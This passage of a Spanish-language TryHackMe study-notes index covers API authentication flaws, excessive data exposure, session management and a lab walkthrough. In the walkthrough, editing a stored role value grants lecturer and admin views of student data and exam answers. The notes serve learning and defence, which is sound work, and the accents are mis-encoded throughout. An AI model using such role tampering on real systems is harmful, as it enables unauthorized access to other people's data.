obtener los detalles de un usuario.\n5. Para arreglar esto, actualizaremos la l√≥gica del query de login para que use tanto el email como la contrase√±a para la validaci√≥n. El endpoint `/apirule2/user/login_s` es un endpoint v√°lido.\n   ![[Pasted image 20251208181250.png]]\n\n------------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Aseg√∫rate de que se configuran contrase√±as complejas con alta entrop√≠a.\n- No expongas credenciales con peticiones **GET** o **POST**.\n- Habilita JWTs fuertes, headers de autorizaci√≥n, etc.\n- Asegura la implementaci√≥n de autentificai√≥n multifactor, bloqueo de cuenta, o sistema de captcha.\n- Asegura que las contrase√±as no se guarden en texto plano.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Vulnerability III - Excessive Data Exposure",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/5-owasp-api-security-top-10-1/5-vulnerability-iii-excessive-data-exposure/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/5. OWASP API Security Top 10 - 1/5. Vulnerability III - Excessive Data Exposure.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 5. OWASP API Security Top 10 - 1",
    "content": "<h2>¬øC√≥mo Ocurre?</h2>\nLa exposici√≥n excesiva de informaci√≥n ocurre cuando las aplicaciones tienden a divulgar m√°s informaci√≥n de la deseada al usuario a trav√©s de la respuesta API. Los desarrolladores de la aplicaci√≥n tienden a exponer todas las propiedades del objeto sin considerar su nivel de sensibilidad. Dejan la tarea de filtrado al desarrollador frontend antes de ser mostrada al usuario. De esta manera, un atacante puede interceptar la respuesta de la API y extraer informaci√≥n delicada.\n\n-------------------------------\n<h2>Impacto Posible</h2>\nUn actor malicioso podr√≠a esnifar el tr√°fico de red y acceder f√°cilmente a informaci√≥n confidencial, incluyendo detalles personales como n√∫meros de cuentas, de tel√©fono, tokens de acceso y m√°s.\n\n----------------------------------\n<h2>Ejemplo Pr√°ctico</h2>\n1. La compa√±√≠a MHT ha lanzado un portal web basado en comentarios que toma los comentarios de los usuarios y los almacena den la base de datos y otra informaci√≥n como localizaci√≥n, dispositivo, etc.\n2. A Bob le han encargado desarrollar el endpoint para mostrar los comentarios de los usuarios en el sitio web principal de la compa√±√≠a. Ha desarrollado el endpoint `apirule3/comment_v/{id}` que recoge la informaci√≥n disponible de la base de datos. Bob asumi√≥ que el desarrollador front-end filtrar√≠a la informaci√≥n que se muestra.\n   ![[Pasted image 20251208193729.png]]\n3. El problema aqu√≠ es que la API est√° mandando m√°s informaci√≥n de la deseada. En lugar de confiar en el desarrollador front-end, s√≥lo deber√≠amos de enviar al front end informaci√≥n necesaria.\n4. Al darse cuenta de su error, Bob actualiz√≥ el endpoint y cre√≥ uno v√°lido en `/apirule3/comment_s/{id}` que devuelve s√≥lo la informaci√≥n necesaria para el desarrollador.\n   ![[Pasted image 20251208194326.png]]\n\n---------------------------------\n<h2>Medidas de Mitigaci√≥n</h2>\n- Nunca dejes tareas de filtraci√≥n de informaci√≥n sensible al desarrollador front-end.\n- Asegura la revisi√≥n de cuando en cuando de la respuesta para garantizar que s√≥lo devuelve informaci√≥n esencial.\n- Evita usar m√©todos gen√©ricos como `to_string()` y `to_json()`.\n- Usa el testeo del endpoint de la API a trav√©s de varios casos y verifica si la API filtra informaci√≥n adicional.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Redireccion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/1-how-websites-work/1-redireccion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/1. How Websites Work/1. Redireccion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 1. How Websites Work",
    "content": "Para ver este curso ve a **THM -> 0. Pre Career -> 1. Pre Security -> 3. How the Web Works -> 3. How Websites Work**",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. How Websites Work",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/1-how-websites-work/0-how-websites-work/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/1. How Websites Work/0. How Websites Work.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 1. How Websites Work",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n[[Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/1. How Websites Work/1. Redireccion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Authentication",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-authentication/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Authentication.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication",
    "content": "1. [[0. Enumeration & Brute Force]]\n2. [[0. Session Management]]\n3. [[0. JWT Security]]\n4. [[0. OAuth Vulnerabilities]]\n5. [[0. Multi-Factor Authentication]]\n6. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/6. Hammer/0. Hammer]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. HTTP Request Smuggling",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/5-http-request-smuggling/5-http-request-smuggling/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/5. HTTP Request Smuggling/5. HTTP Request Smuggling.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 5. HTTP Request Smuggling",
    "content": "",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Injection Attacks",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/2-injection-attacks/2-injection-attacks/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/2. Injection Attacks/2. Injection Attacks.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 2. Injection Attacks",
    "content": "1. [[0. Advanced SQL Injection]]\n2. [[0. NoSQL Injection]]\n3. [[0. XXE Injection]]\n4. [[0. Server-Side Template Injection]]\n5. [[0. LDAP Injection]]\n6. [[0. ORM Injection]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Advanced Server-Side Attacks",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/3-advanced-server-side-attacks/3-advanced-server-side-attacks/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/3. Advanced Server-Side Attacks.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 3. Advanced Server-Side Attacks",
    "content": "1. [[0. Insecure Deserialisation]]\n2. [[0. SSRF]]\n3. [[0. File Inclusion and Path Traversal]]\n4. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/4. Race Conditions/0. Race Conditions]]\n5. [[0. Prototype Pollution]]\n6. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/3. Advanced Server-Side Attacks/6. Include/0. Include]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Advanced Client-Side Attacks",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-advanced-client-side-attacks/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. Advanced Client-Side Attacks.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks",
    "content": "1. [[0. XSS]]\n2. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/0. CSRF]]\n3. [[0. DOM-Based Attacks]]\n4. [[0. CORS & SOP]]\n5. [[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/5. Whats Your Name/0. Whats Your Name]]",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "4. Cookies vs Tokens",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/4-cookies-vs-tokens/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/4. Cookies vs Tokens.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
    "content": "El √∫ltimo tema que tratar antes de profundizar en la seguridad del manejo de sesiones es el tipo de sesi√≥n que se utiliza. Los dos principales acercamientos son cookies y tokens, cada uno con sus beneficios y desventajas.\n\n------------------------------------\n<h2>Manejo de Sesiones Basado en Cookies</h2>\nTambi√©n llamado la forma de la \"vieja escuela\" de hacer las cosas. Una vez que la aplicaci√≥n web quiere iniciar el tracking, como respuesta, el valor del header \"Set-Cookie\" se manda. Tu navegador lo interpreta y lo guarda como un nuevo valor cookie. Veamos un header \"Set-Cookie\":\n\n`Set-Cookie: session=12345;`\n\nTu navegador crear√° una entrada para la cookie llamada `session` con el valor `12345` que ser√° v√°lido para el dominio desde el que se recibi√≥ la cookie. A este header se le pueden a√±adir m√∫ltiples atributos. Si quieres investigar sobre todos pulsa [aqu√≠](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie). Los m√°s relevantes son:\n\n- **Secure:** Indica al navegador que la cookie s√≥lo puede ser transmitida a trav√©s de canales HTTPS verificados. En caso de errores de certificados o uso de HTTP, no se transmitir√°.\n- **HTTPOnly:** Le indica al navegador que el valor de la cookie puede no ser le√≠do por JavaScript del lado del cliente.\n- **Expire:** Le indica al navegador cu√°ndo el valor de la cookie dejar√° de ser v√°lido y debe ser eliminado.\n- **SameSite:** Le indica al navegador si la cookie puede ser transmitida en peticiones a trav√©s de sitios web (cross-site).\n\nUn concepto clave que recordar con la autentificaci√≥n basada en cookies es que el navegador mismo decidir√° cu√°ndo un cierto valor de cookie ser√° mandado con una petici√≥n. Despu√©s de revisar el dominio y los atributos de la cookie, el navegador toma una decisi√≥n y la cookie se pone autom√°ticamente sin necesidad de c√≥digo JavaScript client-side.\n\n----------------------------------------\n<h2>Manejo de Sesiones Basado en Tokens</h2>\nEs un concepto relativamente nuevo. En lugar de usar las funcionalidades autom√°ticas de manejo de cookies del navegador, depende del c√≥digo del lado del cliente para el proceso. Despu√©s de la autentificaci√≥n, la apliaci√≥n web ofrece un token con el resto del cuerpo. Usando JS del lado del cliente, este token se guarda en el LocalStorage del navegador.\n\nCuando se hace una nueva petici√≥n, el JS debe carggar el token desde el almacenamiento y ponerlo como header. Uno de los tipos m√°s comunes es el JWT (JSON Web Token), que se pasan a trav√©s del header `Authorization: Bearer`. Sin embargo, al no usar el manejador de cookies autom√°tico del navegador, es un poco como el lejano oeste (cualquier cosa vale). Aunque hay est√°ndares nada te impide salt√°rtelos.\n\n-----------------------------------\n<h2>Ventajas y Desventajas</h2>\nLos beneficios e inconvenientes de estos m√©todos son:\n\n| **Cookie-Session Management**                                                                                              | **Token-Based Session Management**                                                                                                                                    |\n| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| La cookie es mandada autom√°ticamente por el navegador.                                                                     | El token debe ser subido al header usando JS client-side.                                                                                                             |\n| Los atributos de la cookie pueden usarse para realzar la seguridad de la cookie por parte del navegador.                   | Los tokens no tienen medidas de seguridad autom√°ticas.                                                                                                                |\n| Las cookies pueden ser vulnerables a ataques CSRF.                                                                         | Como no se puede a√±adir a una petici√≥n autom√°ticamente y no puede leerse desde el LocalStorage por otros dominios, no existe riesgo de CSRF.                          |\n| Como est√°n relacionadas estrictamente con un dominio en concreto puede ser tedioso usarlas en sitios web descentralizados. | Funcionan bien en aplicaciones web descentralizadas ya que se manejan a trav√©s de JavaScript y pueden contener toda la informaci√≥n requerida para verificar el token. |",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Securing the Session Lifecycle",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/5-securing-the-session-lifecycle/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/5. Securing the Session Lifecycle.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
    "content": "Por fin es hora de aprender sobre la seguridad del manejo de sesiones. Examinaremos qu√© puede salir mal en cada fase del ciclo de vida del manejo de sesiones.\n\n--------------------------------\n<h2>Creaci√≥n de Sesiones</h2>\nEs donde la mayor√≠a de vulnerabilidades ocurren. Veamos algunas comunes.\n\n<h4>Valores de Sesi√≥n D√©biles</h4>\nEs menos com√∫n ver este tipo de vulnerabilidad hoy en d√≠a. Sin embargo, con el boom de los LLMs y otros asistentes de c√≥digo de IA, te sorprender√≠a ver c√≥mo de com√∫n se esta volviendo.\n\nSi se ha implantado un mecanismo de inicio de sesi√≥n personalizado, hay una buena probabilidad que los valores de sesi√≥n sean adivinables.\n<h4>Valores de Sesi√≥n Controlables</h4>\nEn ciertos tokens, como JWT, toda la informaci√≥n relevante para crear y verificar la validez del JWT es dada. Si no se refuerzan las medidas de seguridad, como verificar la firma del token o asegurarse de que la firma fue creada de manera segura, un atacante podr√≠a generar su propio token.\n<h4>Fijaci√≥n de Sesi√≥n</h4>\nLas aplicaciones web que te dan una sesi√≥n antes de autentificarte pueden ser vulnerables a algo llamado fijaci√≥n de sesi√≥n. Si tu valor de sesi√≥n no rota adecuadamente una vez te autentificas, un atacante podr√≠a cogerla cuando todav√≠a no estas autentificado y usarla para autentificarse.\n<h4>Transmisi√≥n de Sesi√≥n Insegura</h4>\nEn entornos modernos, es com√∫n que el servidor de autentificaci√≥n y el servidor de la aplicaci√≥n sean distintos. Para que esto funcione, tu material de sesi√≥n debe transmitirse de uno a otro. El m√©todo m√°s com√∫n por el cual esto pasa es que el atacante pueda controlar la URL de post autentificaci√≥n. Esto no son cuentos chinos. La implementaci√≥n de una soluci√≥n [SSO en Oracle](https://krbtgt.pw/oracle-oam-10g-session-hijacking/) ten√≠a un bug que permit√≠a esto.\n\n----------------------------------\n<h2>Control de Sesiones</h2>\nEs el segundo sitio m√°s grande de vulnerabilidades.\n\n<h4>Bypasseo de Autorizaci√≥n</h4>\nUn bypasseo de autorizaci√≥n ocurre cuando no hay suficientes comprobaciones siendo realizadas para saber si el usuario tiene permitido realizar la acci√≥n solicitada. Hay dos tipos de bypasses de autorizaci√≥n:\n\n- Bypasseo Vertical: Puedes realizar una acci√≥n que est√° reservada para un usuario con m√°s privilegios.\n- Bypasseo Horizontal: Puedes realizar una acci√≥n que t√∫ puedes hacer, pero en un conjunto de informaci√≥n al que no deber√≠as tener acceso.\n\nEl bypasseo vertical es f√°cilmente remediable, sin embargo el horizontal es m√°s dif√≠cil pues el usuario est√° realizando una acci√≥n que s√≠ est√° autorizado a hacer solo que con la informaci√≥n de otro usuario.\n<h4>Registro Insuficiente</h4>\nUn problema clave durante los incidentes es no tener suficiente informaci√≥n para montar el puzzle de las piezas del ataque. Mientras que mucho registro ocurrir√° a nivel de infraestructura, el registro a nivel de aplicaci√≥n puede ser crucial para entender qu√© sali√≥ mal. Es importante asegurarse de que los registros cubran tanto los inicios de sesi√≥n exitosos como los fallidos.\n\n------------------------------------------\n<h2>Expiraci√≥n de Sesiones</h2>\nTiene una sola vulnerabilidad que es cuando el tiempo de expiraci√≥n de una sesi√≥n es excesivo. Una sesi√≥n deber√≠a ser vista como un ticket a una pel√≠cula. Cada noche se muestra la misma pel√≠cula. Pero no queremos que alguien entre hoy con el ticket de ayer. Para asegurarnos de que el tiempo de sesi√≥n es adecuado debemos tener en cuenta el tipo de acciones que se realizan. Una aplicaci√≥n de banco deber√≠a tener un tiempo de expiraci√≥n m√°s corto que tu cliente de email.\n\n---------------------------------\n<h2>Terminaci√≥n de Sesiones</h2>\nPara la terminaci√≥n de sesiones el problema clave es cuando las sesiones no se cierran bien del todo del lado del servidor. Adem√°s es recomendable que despu√©s de un cambio de contrase√±a se termine la sesi√≥n",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
    "content": "En este tema aprenderemos sobre el manejo de sesiones. Date cuenta de que no das tu usuario y contrase√±a en cada interacci√≥n con la aplicaci√≥n web. Esto es gracias al manejo de sesiones.\n\n-------------------------------------\n<h2>Pre-requisitos</h2>\n- [[2. Introduction to Web Hacking]]\n- [[0. Enumeration & Brute Force]]\n\n-----------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Entender lo que es el manejo de sesi√≥n.\n- Entender la diferencia entre la autentificaci√≥n y autorizaci√≥n y c√≥mo juegan su respectivo rol en el manejo de sesi√≥n.\n- Aprender sobre dos m√©todos principales de manejo de sesi√≥n.\n- Aprender sobre del ciclo de vida del manejo de sesi√≥n.\n- Aprender a explotar pr√°cticamente las implementaciones de manejo de sesi√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Authentication vs Authorisation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/3-authentication-vs-authorisation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/3. Authentication vs Authorisation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
    "content": "Para entender la vulnerabilidades m√°s comunes en el manejo de sesiones, necesitamos examinar la autentificaci√≥n y autorizaci√≥n. Aunque suelen ser confundidas, cada una juega un papel fundamental y √∫nico en el manejo de sesiones. Para explicar las diferencias mejor, examinaremos el modelo IAAA:\n\n![[Pasted image 20251202193557.png]]\n\n-----------------------------------\n<h2>Identificaci√≥n</h2>\nLa identificaci√≥n es el proceso de verificar qui√©n es el usuario. Comienza con el usuario diciendo ser alguien espec√≠fico. En la mayor√≠a de aplicaciones esto se hace subiendo el nombre de usuario.\n\n------------------------------------\n<h2>Autentificaci√≥n</h2>\nEs el proceso de asegurarse de que el usuario es quien dice ser. Para esto se debe proporcionar una contrase√±a.\n\n------------------------------------\n<h2>Autorizaci√≥n</h2>\nEs el proceso de asegurar que un usuario espec√≠fico tiene los privilegios requeridos para realizar la acci√≥n solicitada. El control de sisiones (tracking) juega un papel esencial en la autorizaci√≥n de acciones.\n\n--------------------------------------\n<h2>Responsabilidad</h2>\nEs el proceso de crear un registro con las acciones realizadas por los usuarios. Esta informaci√≥n juega un papel exxtremadamente importante en caso de un incidente.\n\n--------------------------------------\n<h2>IAAA (Identification, Authentication, Authorisation and Accountability) y Manejo de Sesiones</h2>\nAhora que entendemos las diferencias entre estos conceptos, volvamos al manejo de sesiones. La autentificaci√≥n juega su rol en c√≥mo se crean las sesiones. La autorizaci√≥n se vuelve relevante para verificar que el usuario asociado con una cierta sesi√≥n tiene permisos para realizar la acci√≥n que pretende. La responsabilidad es crucial para saber lo que pas√≥ durante un incidente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. What is Session Management",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/2-what-is-session-management/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/2. What is Session Management.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
    "content": "Antes de hablar sobre todo lo que puede salir mal, necesitamos aprender sobre el manejo de sesi√≥n. El protocolo HTTP es stateless. Las sesiones son, por lo tanto, usadas para trackear usuarios a trav√©s de su uso de la applicaci√≥n web. El manejo de sesi√≥n es el proceso de manejar las sesiones y asegurar que se mantienen seguras.\n\n-------------------------------\n<h2>Ciclo de Vida del Manejo de Sesiones</h2>\nLa mejor manera de aprender a cerca del manejo de sesiones es usar el ciclo de vida del manejo de sesiones.\n\n<h4>Creaci√≥n de Sesiones</h4>\nLa sesi√≥n inicial se crea antes de que visites la aplicaci√≥n. Esto lo hacen para controlar lo que haces incluso antes de entrar. Una vez que metes tus credenciales, recibes un valor de sesi√≥n que se manda de nuevo con cada petici√≥n.\n<h4>Control de Sesiones</h4>\nUna vez recibas el valor de sesi√≥n, este se sube con cada nueva petici√≥n. Esto permite a la aplicaci√≥n web rastrear tur acciones incluso aunque el protocolo HTTP sea stateless. Con cada petici√≥n, el servidor puede recuperar el valor de la sesi√≥n y hacer una comprobaci√≥n server-side para asegurarse a qui√©n pertenece.\n<h4>Expiraci√≥n de Sesiones</h4>\nDebido a que HTTP es stateless, puede pasar que un usuario de una aplicaci√≥n web de repente deje de usarla. Como es stateless, no tiene ning√∫n m√©todo para determinar esto. Es por esto que tu sesi√≥n tiene un tiempo de actividad y pasado ese tiempo se elimina el valor de sesi√≥n y la aplicaci√≥n deja de reconocerte.\n<h4>Terminaci√≥n de Sesiones</h4>\nEn algunos casos, el usuario puede forzar el cierre de sesi√≥n. En este escenario, el manager de sesiones deber√≠a eliminar el valor de la sesi√≥n del usuario. Es similar a la expiraci√≥n de sesi√≥n. S√≥lo cambia en que si el temporizador de ttl sigue activo deber√≠a ser terminado inmediatamente.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Exploiting Insecure Session Management",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/6-exploiting-insecure-session-management/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/6. Exploiting Insecure Session Management.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
    "content": "Vamos a resolver la siguiente m√°quina.\n\n--------------------------------------\n<h2>Enumeration</h2>\nPara poder explotar un ciclo de vida de un manejo de sesiones vulnerable, necesitamos mapear el ciclo de vida para nosotros mismos y redactar notas detalladas. Una vez que entendamos lo que realiza el ciclo de vida, podemos empezar a buscar debilidades.\n\n1. Navegamos al sitio web que nos dan.\n   ![[Pasted image 20251202225016.png]]\n   Si abrimos las herramientas de desarrollador, podemos ver que de primeras no nos dan ninguna cookie/token, por lo que sabemos que las sesiones no autentificadas no est√°n siento controladas.\n2. Si le damos a Sign Up, vemos que hay dos maneras principales de hacerlo.\n   ![[Pasted image 20251202225201.png]]\n   - Estudiante\n   - Profesor\n   Esto nos indica que incluso sin m√©todos de fuerza bruta, podemos lanzar el ciclo de vida del manejo de sesiones creando una cuenta de estudiante.\n   3. Vamos a crear una cuenta de estudiante.\n      ![[Pasted image 20251202225451.png]]\n   4. Hemos recibido una notificaci√≥n de que se ha creado la cuenta. Vamos a iniciar sesi√≥n.\n      ![[Pasted image 20251202234738.png]]\n      ![[Pasted image 20251202233044.png]]\n      Esto nos da algo de informaci√≥n:\n      - Las cookies se usan para el manejo de sesi√≥n.\n      - La flag HTTPOnly esta configurada lo que significa que no deber√≠amos ser capaces de usar JavaScript para leer el valor de la cookie.\n      - El tiempo de expiraci√≥n de la cookie se ve raro ya que el tiempo de creaci√≥n y de expiraci√≥n son el mismo.\n   5. Con esta autentificaci√≥n, tenemos acceso a m√°s funcionalidades.\n      ![[Pasted image 20251202230411.png]]\n   6. Viendo el apartado de red podemos ver que el control de sesi√≥n est√° reforzado por la cookie que est√° siendo transmitida en cada petici√≥n.\n      ![[Pasted image 20251202230900.png]]\n      Algo interesante en lo que fijarse, es que aunque la fecha de expiraci√≥n haya sido alcanzada, el mismo header de cookie se usa para refrescar la cookie al mismo valor. Esto puede apuntar a una cookie persistente. Veamos lo que pasa cuando eliminamos la cookie.\n   7. Eliminamos la cookie en storage y hacemos la petici√≥n de modules otra vez.\n      ![[Pasted image 20251202233219.png]]\n      Ahora ya no hay cookie en la petici√≥n.\n   8. Parece que sigue cargando, pero ahora no podemos ver el n√∫mero de alumnos matriculados en cada uno de los m√≥dulos.\n      ![[Pasted image 20251202230956.png]]\n      Esto requiere m√°s investigaci√≥n ya que tenemos que ver qu√© acciones podemos realizar con una cuenta sin autentificar.\n   9. Si presionamos el bot√≥n de log out podemos ver que nuestra sesi√≥n se borra completamente del lado del cliente.\n      ![[Pasted image 20251202233718.png]]\n      Sin embargo debemos comprobar si tambi√©n ha sido eliminada del lado del servidor.\n   10. Para hacerlo vamos a iniciar sesi√≥n y a sustituir la cookie actual por la cookie pasada.\n       ![[Pasted image 20251202234606.png]]\n       Parece que la terminaci√≥n de sesi√≥n funciona porque recibimos error 500.\n   11. Si vamos a local storage, vemos que hay cierta informaci√≥n siendo guardada.\n       ![[Pasted image 20251202234910.png]]\n   12. Cambiaremos el rol de Student a Lecturer.\n       ![[Pasted image 20251202235014.png]]\n       Parece que ahora tenemos acceso a m√°s opciones, sin embargo no hay m√°s informaci√≥n relevante.\n   13. Cambiemos el valor del usuario de 2 a 1.\n       ![[Pasted image 20251202235722.png]]\n       Nada cambia.\n\nDeberemos volver m√°s adelante pero todo esto nos dice que puede que las sesiones se est√©n manejando mediante tokens y no mediante cookies.\n\nEchemos un vistazo al mapeo que hemos hecho:\n\n| Fase del Ciclo      | Observaci√≥n                                                                                                             |\n| ------------------- | ----------------------------------------------------------------------------------------------------------------------- |\n| Session Creation    | Se usa una combinaci√≥n de cookie y token.                                                                               |\n| Session Creation    | Se recibe un valor de sesi√≥n nuevo por cada inicio de sesi√≥n.                                                           |\n| Session Creation    | El valor de la sesi√≥n parece ser suficientemente random.                                                                |\n| Session Tracking    | Las acciones no autentificadas no se trackean v√≠a sesi√≥n.                                                               |\n| Session Tracking    | La cookie se manda en cada petici√≥n.                                                                                    |\n| Session Tracking    | Se pueden hacer peticiones sin cookie.                                                                                  |\n| Session Tracking    | Los valores del token inicial dictan la informaci√≥n visible.                                                            |\n| Session Expiry      | Hay una descordinaci√≥n entre lo tiempos de expiraci√≥n del lado del cliente y del servidor.                              |\n| Session Expiry      | El tiempo de expiraci√≥n es muy largo.                                                                                   |\n| Session Termination | Los usuarios pueden terminar su sesi√≥n forzosamente.                                                                    |\n| Session Termination | Las sesiones se terminan del lado del servidor pero reusar una sesi√≥n antigua conlleva a in error interno del servidor. |\n\nDada toda esta informaci√≥n reportar√≠amos las siguientes vulnerabilidades en un reporte de seguridad:\n\n- Tiempo de sesi√≥n excesivo.\n\nDeber√≠amos adem√°s investigar:\n\n- Controles de acceso en todos los endpoints API.\n- Logs de aplicaciones web por la responsabilidad de acciones.\n\n------------------------------------------\n<h2>Explotaci√≥n</h2>\n1. Desde la sesi√≥n como \"Lecturer\" vamos al apartado de estudiantes y miramos el que se llama \"X\". Podr√≠amos filtrar por nombre con `Contains: X`.\n   ![[Pasted image 20251203000826.png]]\n   \n>[!CAUTION] Esta flag est√° buggeada.\n\n2. Si cambiamos el rol a \"admin\" vemos que s√≥lo hay registrado 1.\n   ![[Pasted image 20251203001328.png]]\n3. Si vamos al apartado de tests podemos ver la mayor nota de Student1.\n   ![[Pasted image 20251203001731.png]]\n4. Adem√°s como en el otro examen no hay intentos tambi√©n sabemos que los intentos totales fueron 4.\n5. Miramos las respuestas del examen.\n   ![[Pasted image 20251203001814.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Session Management",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/2-session-management/0-session-management/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/0. Session Management.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 2. Session Management",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/2. Session Management/1. Introduction]]\n[[2. What is Session Management]]\n[[3. Authentication vs Authorisation]]\n[[4. Cookies vs Tokens]]\n[[5. Securing the Session Lifecycle]]\n[[6. Exploiting Insecure Session Management]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Sensitive Information Disclosure",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/3-jwt-security/3-sensitive-information-disclosure/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/3. JWT Security/3. Sensitive Information Disclosure.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 3. JWT Security",
